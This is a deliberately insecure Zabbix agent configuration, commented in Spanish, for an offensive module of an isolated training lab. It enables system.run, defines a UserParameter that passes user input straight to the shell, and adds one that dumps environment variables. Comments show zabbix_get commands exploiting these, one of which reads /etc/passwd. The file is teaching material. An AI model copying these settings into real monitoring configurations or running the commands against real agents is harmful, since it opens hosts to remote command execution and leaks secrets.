# ===========================================================================
#  ⚠⚠⚠  AGENTE DELIBERADAMENTE INSEGURO  ⚠⚠⚠
#  SOLO para el módulo ofensivo del laboratorio (docs/04-superficie-ataque.md).
#  Reúne los tres antipatrones clásicos de un agente Zabbix mal configurado.
#  NUNCA en un sistema real. Vive en la red aislada 'vuln'.
# ===========================================================================

# Antipatrón 1: ejecución remota de comandos habilitada (vía AllowKey del compose:
#   ZBX_ALLOWKEY: system.run[*]). Permite  zabbix_get -k 'system.run[<cmd>]'

# Antipatrón 2: UserParameter que pasa el argumento del usuario a la shell.
# Esto es una ejecución remota de comandos encubierta e imposible de auditar.
UserParameter=cmd[*],$1

# Antipatrón 3: métrica "útil" que filtra información sensible del host.
UserParameter=leak.env,env

# Cómo se explota (en el aula, contra 127.0.0.1:10050):
#   zabbix_get -s 127.0.0.1 -p 10050 -k 'system.run[id]'
#   zabbix_get -s 127.0.0.1 -p 10050 -k 'cmd[cat /etc/passwd]'
#   zabbix_get -s 127.0.0.1 -p 10050 -k 'leak.env'
# Y cómo se remedia: exactamente la config de config/agent-web/lab.conf.
